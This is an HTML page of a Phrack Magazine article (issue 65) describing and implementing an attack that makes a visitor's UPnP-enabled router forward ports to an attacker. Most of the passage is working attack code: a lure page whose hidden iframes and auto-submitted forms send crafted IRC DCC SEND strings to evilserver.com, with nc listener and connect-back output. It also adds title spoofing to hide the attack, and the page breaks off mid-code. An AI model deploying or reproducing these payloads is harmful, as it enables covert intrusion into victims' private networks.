@@ -1,0 +1,1102 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Clawing holes in NAT with UPnP ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a class="current" href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack65.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack65.tar.gz" title="Get current issue tar.gz">65</a> | <strong>Release date</strong> : <b>2008-11-04</b> | <strong>Editor</strong> : <b>TCLH</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/65/1.html#article">Introduction</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/65/2.html#article">Phrack Prophile on The UNIX Terrorist</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/65/3.html#article">Phrack World News</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/65/4.html#article">Stealth Hooking: another way to subvert the Windows kernel</a></td><td align="right">Mxatone and IvanLeFou</td></tr>
+<tr><td align="left"><a href="../../issues/65/5.html#article">Clawing holes in NAT with UPnP</a></td><td align="right">FelineMenace</td></tr>
+<tr><td align="left"><a href="../../issues/65/6.html#article">The only laws on Internet are assembly and RFCs</a></td><td align="right">Julia</td></tr>
+<tr><td align="left"><a href="../../issues/65/7.html#article">System Management Mode Hacks</a></td><td align="right">BSDaemon and coideloko and D0nand0n</td></tr>
+<tr><td align="left"><a href="../../issues/65/8.html#article">Mystifying the debugger for ultimate stealthness</a></td><td align="right">halfdead</td></tr>
+<tr><td align="left"><a href="../../issues/65/9.html#article">Australian Restricted Defense Networks and FISSO</a></td><td align="right">the Finn</td></tr>
+<tr><td align="left"><a href="../../issues/65/10.html#article">phook - The PEB Hooker</a></td><td align="right">Shearer and Dreg</td></tr>
+<tr><td align="left"><a href="../../issues/65/11.html#article">Hacking the $49 Wifi Finder</a></td><td align="right">openschemes</td></tr>
+<tr><td align="left"><a href="../../issues/65/12.html#article">The art of exploitation: Technical analysis of Samba WINS overflow</a></td><td align="right">FelineMenace</td></tr>
+<tr><td align="left"><a href="../../issues/65/13.html#article">The Underground Myth</a></td><td align="right">Anonymous</td></tr>
+<tr><td align="left"><a href="../../issues/65/14.html#article">Hacking your brain: Artificial Conciousness</a></td><td align="right">-c</td></tr>
+<tr><td align="left"><a href="../../issues/65/15.html#article">International Scenes</a></td><td align="right">various</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Clawing holes in NAT with UPnP</div>
+<div class="opt-bottom"> <strong>Author</strong> : FelineMenace</div>
+<pre>                             ==Phrack Inc.==
+
+               Volume 0x0c, Issue 0x41, Phile #0x05 of 0x0f
+
+|=-----------------=[ Clawing holes in NAT with UPnP ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=---=[ max_packetz@felinemenace.org &lt;http://www.felinemenace.org&gt; ]=----=|
+|=--------------------------=[ April 12th 2008 ]-=-----------------------=|
+
+--[ Contents
+
+  1 - Introduction / An overview of NAT and UPnP.
+
+  2 - Implementation Details
+   2.1 - Implementation specifics: IRC Protocol: DCC 
+   2.2 - Implementation specifics: Java
+   2.3 - Implementation specifics: HTML
+   2.4 - Implementation specifics: Listener
+
+  3 - Putting it all together with Python
+
+  4 - References
+
+  5 - Appendix A: Source code
+
+
+--[ 1 - Introduction / An overview of NAT and UPnP.
+
+Welcome reader, this paper is a short attempt at documenting a 
+practical technique we have been working on. Although our technique 
+uses very similar technology to many other attacks, we have not 
+seen this documented in such a manner before, nor have we seen a 
+practical implementation in the wild. This paper is therefore designed 
+to accommodate this.
+
+Our technique allows the attacker (us) to craft a website which, 
+when visited, will cause the victim to inadvertently forward any port 
+of our choice through their NAT, allowing us to connect directly to them 
+inside their private network via UPnP.
+
+Before we launch into the specifics of the technique, or our 
+implementation details, you must first be familiar with a couple of 
+fairly straight forward concepts. These are: &quot;Network Address 
+Translation&quot; (NAT) and &quot;Universal Plug and Play&quot; (UPnP).
+
+Hopefully most people reading this paper are already familiar with 
+NAT. For those who arn't, NAT basically allows several machines 
+to share a single IP address without conflict. This means that a single 
+computer or router acts as a gateway for several other computers. To 
+learn more about the specifics of NAT read the RFC in the references 
+section [1].
+
+For a typical home user, NAT is implemented by their DSL modem/router
+and is fairly seamless. The internal IP address is assigned by a DHCP
+service on the router and internal users are almost never aware of 
+their external address.
+
+It is a common misconception that NAT provides an impenetrable
+security layer for the internal hosts. Often this leads to a 
+more lapse security policy for internal machines, and a nice 
+gaping hole for anyone who manages to penetrate the outer shell.  
+It is very common to find publicly accessible smb shares or poorly 
+patched services etc. using our technique.
+
+The other concept which you must be familiar with before we 
+can get into the (hopefully) interesting section of this paper
+is &quot;Universal Plug and Play &quot;, UPnP. 
+
+Universal Plug and Play (UPnP) is a set of protocols which were 
+consolidated by the UPnP forum. The general theme which all these 
+protocols have in common is that they allow for seamless implementation 
+of networks and data communication.
+
+The major feature of this protocol suite which is of interest to us in 
+the context of this paper is the NAT punching functionality.
+
+This feature describes how a gateway can parse various protocols 
+passing through it in order to forward ports through the NAT to the 
+internal service. It is designed in order to allow any host behind the 
+NAT to request that a port be opened up in the outer layer, and any 
+traffic received on this port will be forwarded through to the internal
+machine, creating new channel for communications.  This functionality
+allows protocols such as FTP/SIP/etc to function.  In these cases the 
+gateway responsible for NAT will parse the protocol stream looking for 
+requests for a separate channel to be created. It will then search and
+replace the IP and port values as they pass over the wire, replacing 
+them with the external values.  Thus, the other end of the transaction
+knows to try to connect to the external IP address and port, rather 
+than the internal values.
+
+It is very common currently for most household ADSL/modems and routers 
+to ship with UPnP enabled by default. Also the Linux kernel supports 
+UPnP with ipfilter, however this isn't a default config option and
+only really active when using a Linux box as a gateway device.
+
+It's this feature that we are able to exploit in order to create the 
+forwarding of our choice, allowing us access any specific port on a 
+host behind the NAT directly, regardless of the fact the NAT is there.
+
+--[ 2 - Implementation Specifics
+
+In this chapter we will try to provide a detailed overview of our 
+technique itself and discuss our implementation details. We will 
+try to explain the criteria for selecting each of the protocols and 
+technologies we used for implementing each component of our technique.
+
+For those of you familiar with the technologies associated with our 
+implementation, the overview below should be enough for you to implement 
+our technique by yourself.  However we would like to note that our 
+technique can be implemented in other ways, and our implementation 
+serves as just one example. We will only discuss the various technologies 
+used by felinemenace throughout the rest of this paper.
+
+The basic premis of our technique is to encapsulate one protocol 
+(specifically one of the protocols which are handled by UPnP NAT 
+Punching functionality) within a second, transport protocol. This way 
+when the gateway see's the traffic it will interpret the encapsulated 
+protocol string as a request to open a port, and act accordingly.
+
+Our implementation begins by convincing the victim to visit a website 
+of our choice. This can be accomplished via social engineering, cross 
+site scripting, phishing, baiting, banner ads, etc. Once the victim 
+has accessed our site, we have enough control over their browser in 
+order to redirect it to any port of our choice, on any address. This 
+flexibility allows us to accomodate almost any choice of protocol to 
+be encapsulated within the web session. The aformentioned behaviour 
+makes (in the author's opinion) the use of HTML/Javascript, as a 
+delivery mechanism, to be a very effective choice. 
+
+When the victim accesses the website a fake (bait) web site is displayed 
+to them. This is done so as not to encourage the user to immediately close
+the page upon load.
+
+From this stage the attacker uses one of the various methods of 
+browser redirection, HTTP response, javascript redirection etc. in
+order to redirect the victim's browser to a port of the attacker's 
+choice. We chose JavaScript since a large portion of the technique was
+already written in JavaScript. This is documented in the HTML section
+of the paper.
+
+The attacker chooses a port which corresponds to a particular protocol
+that performs a data transfer out of band with the initial communication. 
+In our case we chose the DCC feature from the IRC protocol. [3] Our reason
+for choosing this protocol was simply because we were already familiar 
+with it however, any protocol which fits this criteria is fine. The 
+attacker then (using the JavaScript running on the victims computer at 
+this stage) forces the victim to send text from the appropriate 
+protocol, (DCC in our case) back to the attacker. If the gateway 
+device responsible for NAT has UPnP features enabled, this will cause 
+the device to open up a hole (as mentioned previously) and grant the 
+attacker direct access to the local machine behind the NAT.
+
+By redirecting multiple times, an attacker is able to open up a range
+of ports, to portscan the host, or connect to any service running
+on the local machine.
+
+We have provided an implementation of this for you to use, however 
+obviously writing your own will make it less detectable / more useful.
+
+Now that we've looked at the technique from a high level breakdown we 
+will dive deeper into each of the technologies which come together to 
+make our technique work.
+
+To summarize this section, the following technologies will be covered
+by this paper:
+
+o IRC Protocol: DCC
+o A Java Applet.
+o HTML with JavaScript.
+o Python code to ./scriptkiddify the whole process up.
+
+The rest of this chapter has been broken down into a walkthru of the 
+in's and out's of each of the technologies mentioned, and how we can 
+manipulate them to our desired end.
+
+Each of the following sections will describe a single technology, and how
+we used it.
+
+--[ 2.1 - Implementation specifics: IRC Protocol: DCC
+
+The first step in our implementation is to find a protocol which requires
+a separate socket connection in order to communicate directly with 
+an end user. 
+
+While, as mentioned previously, there exist a multitude of protocols 
+which fit our criteria, for the sake of this paper we will demonstrate
+one in particular, RFC-1459 [3] Internet Relay Chat.
+
+While i'm sure that most people reading this paper are already 
+intimately familiar with IRC, i will give a brief rundown on the aspects 
+of the protocol which are interesting in the scope of this paper.
+
+Basically IRC requires that each client connects to a central server,
+typically on port 6667. When one client wishes to send a message to another
+they send a message to the server using the existing socket connection they
+have open. The server then forwards this message on to the target client.
+
+If two of the users on an IRC server wish to communicate without having the
+server be responsible for passing the message between them, (read; trade
+top secret 0day juarez) they can establish a separate communication 
+channel. This is accomplished by using a subset of the IRC protocol known 
+as DCC (Direct Client to Client).
+
+DCC works by one client sending a request to establish an out of band
+connection with another client on the IRC server. This request contains 
+both the IP and port on which the communication will take place. The 
+second client then simply establishes a TCP connection with these 
+details, and uses it for further communication. 
+
+What this basically boils down to is the following line.
+
+&quot;\x01DCC SEND fake.exe 2130706433 1337\x01\r\n\r\n&quot;
+
+This is the format of a DCC SEND command. As you can see the entire 
+command is enclosed within &quot;\x01&quot; characters. It contains the words
+&quot;DCC SEND&quot; followed by the name of the file which is going to be sent.
+After this is the internal IP address of the requesting host, in numeric
+decimal format, and finally the port the transaction will take place on.
+The format of the IP address is explained more thoroughly by optiklenz in 
+Keen Veracity 6 [5].
+
+This aspect of the protocol clearly will not work under a typical NAT 
+environment (without UPnP enabled).  After receiving the IP address and 
+port information, the connecting host would end up trying to connect to a 
+local address (the address of the machine inside the NAT), and
+never actually make it back to the intended recipient. It is for this 
+reason that a UPnP enabled gateway must parse IRC traffic looking for 
+DCC style commands. When this is detected, the gateway will replace 
+the IP address in the request, with it's own address. When the 
+connection is received on the port specified, the gateway will forward 
+it inside the NAT to the originating host. It is this behaviour that, 
+as the attacker, we can exploit for our own benefit.
+
+If, as the attacker, we force the victim to send a crafted DCC SEND request
+(such as the one above) to port 6667 there's a good chance that the 
+gateway will open up the port specified in the request, providing UPnP is 
+enabled. The cool thing about this protocol is that no IP address is 
+specified for the connecting IP. This means that once the request has 
+taken place, a connection from anywhere in the world is completely valid. 
+
+Several implementations of UPnP do not even care if the IP address 
+specified in the DCC SEND command is the same as that of the victim 
+machine. In this case, the steps described so far are sufficient to open a 
+gaping hole in the gateway and connect to the victim. However in most 
+cases we need to first establish the internal IP address of the victim's 
+machine.
+
+Luckily there is an easy way to accomplish this from the web, which we 
+will address in the next section.
+
+--[ 2.2 - Implementation specifics - Java
+
+The easiest way to identify the local IP of the victim from the web is
+to use a Java applet. Applets are able to create a new Socket object and 
+call the &quot;getLocalAddress()&quot; method on it to obtain the local address of 
+the host (obviously).
+
+The following Java code illustrates this: 
+
+String s = (new Socket(s2, i)).getLocalAddress().getHostAddress();
+
+Luckily for us, there already exists a nicely pre-packaged Java applet 
+called MyAddress [4] which does this and can be downloaded straight from 
+their website.  
+
+The applet supports a variety of ways to access the local
+IP once it is obtained. One way is to specify the &quot;mayscript&quot; parameter
+in the applet tag; this causes a javascript function (MyAddress() by 
+default) to be called once the IP is obtained.  This is useful, as we can 
+effectively block until we receive this neccessary data.
+
+The following HTML demonstrates the use of this applet and the MyAddress()
+callback function.  Also (as mentioned earlier in the DCC protocol section)
+as the local IP address must be entered in &quot;defunct&quot; format, we've 
+provided the defunct() function to translate from decimal format to 
+defunct:
+
+	&lt;applet code=&quot;MyAddress.class&quot; name=&quot;myaddress&quot; 
+	 mayscript width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/applet&gt;
+	&lt;script&gt;
+	&lt;!--
+		var ip = null;
+		function MyAddress(i) {ip = defunct(i); doevil();}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(&quot;.&quot;);
+			var l = a.length;
+			for(var i=0; i&lt;l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+	--&gt;
+	&lt;/script&gt;
+
+--[ 2.3 - Implementation specifics: HTML
+
+Now that we can create a proper DCC send string, the next problem 
+to overcome is how to force the client to unknowingly send the 
+encapsulated string to a malicious server, thereby tricking their
+gateway into forwarding a port we specify.  HTML forms submitted 
+automatically via javascript are highly useful for this.
+
+Since the DCC string (and many other protocols you might choose
+to use with this technique) require multiple lines of communication
+to trigger the UPnP NAT traversal features, we set the &quot;enctype&quot; 
+attribute to &quot;multipart/form-data&quot;.  This allows the required 
+carriage return and new line characters to be submitted via a 
+form field.
+
+The following form tag shows how to specify the enctype:
+
+	&lt;form 	
+		id=&quot;evilform&quot; 
+		name=&quot;evilform&quot; 
+		action=&quot;http://evilserver.com:6667/&quot;
+		method=&quot;post&quot; 
+		enctype=&quot;multipart/form-data&quot;
+	&gt;
+
+In order to automate the submission of our DCC string (payload), 
+we use javascript to submit the form (after the internal IP address
+is obtained) via the form submit() method as follows:
+
+	function doevil(ip, port) {
+		var frm = document.forms['evilform'];
+		if(frm == null) return;
+		frm.payload.value = unescape(&quot;%01&quot;)
+			+ &quot;DCC SEND evil.txt &quot; + ip + &quot; &quot; + port + 
+			+ unescape(&quot;%01%0a%0d&quot;);
+		try { frm.submit(); } catch(err) { return; }
+	}
+	
+As you can see we've used javascript to craft the payload string,
+because of the neccessary (depending of gateway implementation) 
+carriage return and newline characters.
+
+The following HTML code demonstrates the code so far, including
+the use of the MyAddress applet mentioned in the previous section:
+
+	&lt;html&gt;
+	&lt;head&gt;
+	&lt;title&gt;(Untitled)&lt;/title&gt;
+	&lt;applet code=&quot;MyAddress.class&quot; name=&quot;myaddress&quot; 
+	        mayscript width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/applet&gt;
+	&lt;script&gt;
+	&lt;!--
+		var port = 1337;
+		function MyAddress(i) {ip = defunct(i); doevil(ip, port);}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(&quot;.&quot;);
+			var l = a.length;
+			for(var i=0; i&lt;l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(frm == null) return;
+			frm.payload.value = unescape(&quot;%01&quot;)
+				+ &quot;DCC SEND evil.txt &quot; + ip + &quot; &quot; + port + 
+				+ unescape(&quot;%01%0a%0d&quot;);
+			try { frm.submit(); } catch(err) { return; }
+		}
+	--&gt;
+	&lt;/script&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+	&lt;form 	
+		id=&quot;evilform&quot; 
+		name=&quot;evilform&quot; 
+		action=&quot;http://evilserver.com:6667/&quot;
+		method=&quot;post&quot; 
+		enctype=&quot;multipart/form-data&quot;
+	&gt;
+	&lt;input type=&quot;input&quot; id=&quot;payload&quot; 
+	 name=&quot;payload&quot; value=&quot;null&quot;&gt;
+	&lt;/form&gt;
+	&lt;/body&gt;
+	&lt;/html&gt;
+
+By simply binding netcat to port 6667 of evilserver.com, this 
+code is enough to manually connect back to the port &quot;port&quot; once
+a victim has viewed this web page, as the following snippet 
+demonstrates:
+
+-[max@evilserver:~/simple]$ nc -lp 6667
+POST / HTTP/1.1
+Host: evilserver.com:6667
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.13) 
+Gecko/20080311 Firefox/2.0.0.13
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,
+text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://evilserver.com/simpletest.html
+Content-Type: multipart/form-data; boundary=---------------------------
+162151946613101846322123277333
+Content-Length: 213
+
+-----------------------------162151946613101846322123277333
+Content-Disposition: form-data; name=&quot;payload&quot;
+
+DCC SEND evil.txt 16909060 1337NaN
+-----------------------------162151946613101846322123277333--
+
+You can see that a victim has connected to our webpage (simpletest.html)
+and that the page has automatically submitted our DCC SEND send string.
+Using netcat again, we can connect back to the ip and port above (using 
+the defunct format works fine with nc):
+
+-[max@evilserver:~/simple]$ nc 16909060 1337
+muahahaha
+what are you doing here?!  
+
+Here's what it looks like from the victim's end:
+
+-[victim@QQ:~]$ nc -lp 1337
+muahahaha
+what are you doing here?!  
+
+Obviously there are some significant drawbacks to using this
+simplified example...who wants to sit and manually monitor 
+their connections and then manually connect back to victims?
+What if you want to connect to multiple ports?  Won't it kinda
+tip the victim off (or at least bore them mightily) if there's 
+nothing but a dodgy page for them to look at?  How about something
+interesting?  Like maybe an article....
+
+The topic of the listening and connect back mechanism is addressed
+in the next section of this chapter.  The content problem and the 
+ability to forward multiple ports per visit are addressed by creating
+an additional page (evil.html) that contains two HTML iframes, one hidden 
+and one visible.  While the victim is distracted by content in the 
+visible iframe (goodframe), the hidden iframe (evilframe) 
+loads the second page (evilform.html) in order to post (as many times 
+as desired) to evilserver.
+
+The code might look something like this (note that we keep the 
+MyAddress code in evil.html; there's no sense in loading it multiple
+times):
+
+evil.html:
+
+	&lt;html&gt;
+	&lt;head&gt;
+	&lt;title&gt;(Untitled)&lt;/title&gt;
+	&lt;applet code=&quot;MyAddress.class&quot; name=&quot;myaddress&quot; 
+	        mayscript width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/applet&gt;
+	&lt;script type=&quot;text/javascript&quot;&gt;
+	&lt;!--
+		var ports = [135,137,138,139,22,1337];
+		var port = null;
+		var ip = null;
+
+		function MyAddress(i) {ip = defunct(i); openports();}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(&quot;.&quot;);
+			var l = a.length;
+			for(var i=0; i&lt;l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+		function openports() {
+			if(!ports || !ip) return;
+			for(port in ports) 
+				document.getElementById('evilframe').src = 'evilform.html'; 
+		}
+	--&gt;
+	&lt;/script&gt;
+	&lt;/head&gt;
+	&lt;body style=&quot;padding: 0px; border:none; margin:0px;&quot;&gt;
+	&lt;iframe name=&quot;evilframe&quot; id=&quot;evilframe&quot; src=&quot;&quot; 
+	        width=&quot;0&quot; height=&quot;0&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
+	&lt;iframe name=&quot;goodframe&quot; id=&quot;goodframe&quot; 
+	       src=&quot;http://google.com&quot; width=&quot;100%&quot; height=&quot;100%&quot;
+	       frameborder=&quot;0&quot;&gt;
+        &lt;/iframe&gt;
+	&lt;/body&gt;
+	&lt;/html&gt;
+
+Upon load, evilform.html will access evil.html's (its parent's) variables
+&quot;port&quot; and &quot;ip&quot; to craft the payload DCC string and then post:
+
+evilform.html:
+
+	&lt;html&gt;
+	&lt;head&gt;
+	&lt;title&gt;(Untitled)&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;script&gt;
+	&lt;!--
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(ip == null || port == null || frm == null) return;
+			frm.internal_ip.value = 'internal_ip:'+ip;
+			frm.internal_port.value = 'internal_port:'+port;
+			frm.payload.value = unescape(&quot;%01&quot;)
+				+ &quot;DCC SEND evil.txt &quot; + ip + &quot; &quot; + port + 
+				+ unescape(&quot;%01%0a%0d&quot;);;
+			window.parent.formposting();
+			try { frm.submit(); } catch(err) { return; }
+		}
+	--&gt;
+	&lt;/script&gt;
+	&lt;body onload=&quot;doevil(window.parent.ip, window.parent.port)&quot;&gt;
+	&lt;form 	
+		id=&quot;evilform&quot; 
+		name=&quot;evilform&quot; 
+		action=&quot;http://evilserver.com:6667/&quot;
+		method=&quot;post&quot; 
+		enctype=&quot;multipart/form-data&quot;
+	&gt;
+	&lt;input type=&quot;input&quot; id=&quot;payload&quot; name=&quot;payload&quot; value=&quot;null&quot;&gt;
+	&lt;input type=&quot;input&quot; id=&quot;internal_ip&quot; name=&quot;internal_ip&quot; value=&quot;null&quot;&gt;
+	&lt;input type=&quot;input&quot; id=&quot;internal_port&quot; name=&quot;internal_port&quot; value=&quot;null&quot;&gt;
+	&lt;/form&gt;
+	&lt;/body&gt;
+	&lt;/html&gt;
+  
+Note that evilform.html is now also setting two additional form variables
+(with some tags to make them easier to regex out later) so that the 
+listener can note what the internal port and IP of the victim are.  Since 
+these variables aren't within a protocol string (like the DCC send string)
+the gateway will not replace them with the external values.
+
+Unfortunately, however,  the code above introduces a race condition: you
+can't be assured that evilform.html has had enough time to load and post 
+before it gets reloaded. We originally expected that this could be 
+remedied if the service listening on 6667 of evilserver.com replied with a 
+page that invoked a callback function in the parent page in the following
+manner:
+
+	&lt;script&gt;window.parent.imdone();&lt;/script&gt;
+
+Unfortunately, modern browsers will limit access to data across iframes if 
+the source page's scheme, domain, or port is different.  Because our post
+is neccessarily to a different port (6667 vs 80), the above code will 
+always generate an exception.
+
+Our solution was to mitigate the issue by putting in enough delay after 
+evilform.html begins loading as to be reasonably assured that the page
+has completed it's automatic posting before reloading it. Since javascript
+has no sleep() function (that we could find), we used 
+window.setTimeout(fn, t):
+
+evil.html:
+	...
+		function MyAddress(i) {ip = defunct(i); opennextport();}
+	...
+		function formposting() {
+			window.setTimeout('opennextport()', 1000)
+		}
+		function opennextport() {
+			if(!ports || cp &lt; 0 || cp &gt; ports.length) return;
+			port = ports[cp++];
+			document.getElementById('evilframe').src = 'evilform.html'; 
+		}
+
+	...
+
+evilform.html:
+	...	
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(ip == null || port == null || frm == null) return;
+			frm.internal_ip.value = 'internal_ip:'+ip;
+			frm.internal_port.value = 'internal_port:'+port;
+			frm.payload.value = unescape(&quot;%01&quot;)
+				+ &quot;DCC SEND evil.txt &quot; + ip + &quot; &quot; + port + 
+				+ unescape(&quot;%01%0a%0d&quot;);;
+			window.parent.formposting();
+			try { frm.submit(); } catch(err) { return; }
+		}
+	...
+
+One cosmetic issue remains with our code: the title of evil.html will not
+match that of our bait page.  If the bait page is hosted via the same 
+scheme on the same domain and port as evil.html, then this can be easily
+remedied with this code snippet:
+
+	function settitle() { document.title = 
+	window.frames['goodframe'].document.title; }
+	...
+	&lt;body onload=&quot;settitle()&quot;&gt;
+
+However, as previously mentioned, if the bait page is hosted on a 
+different server or using a different scheme, accessing goodframe's 
+document title would cause an exception to be raised.  In either case, 
+if the victim were to follow an internal link, the title would become 
+outdated.  Our solution was to wrap the assignment in a try / catch block
+and to set a timeout to call settitle again in 350 milliseconds:
+
+		function settitle() {
+			try{ document.title = window.frames['goodframe'].document.title;} 
+			catch(err) {return;}
+			window.setTimeout('settitle()', 350);
+		}
+
+
+Below is the final code:
+
+evil.html:
+
+	&lt;!-- evil.html --&gt;
+	&lt;html&gt;
+	&lt;head&gt;
+	&lt;title&gt;(Untitled)&lt;/title&gt;
+	&lt;applet code=&quot;MyAddress.class&quot; name=&quot;myaddress&quot; 
+	        mayscript width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/applet&gt;
+	&lt;script type=&quot;text/javascript&quot;&gt;
+	&lt;!--
+		var ip = null;
+		var port = null;
+		var ports = [135,137,138,139,22,1337];
+		var cp = 0;
+
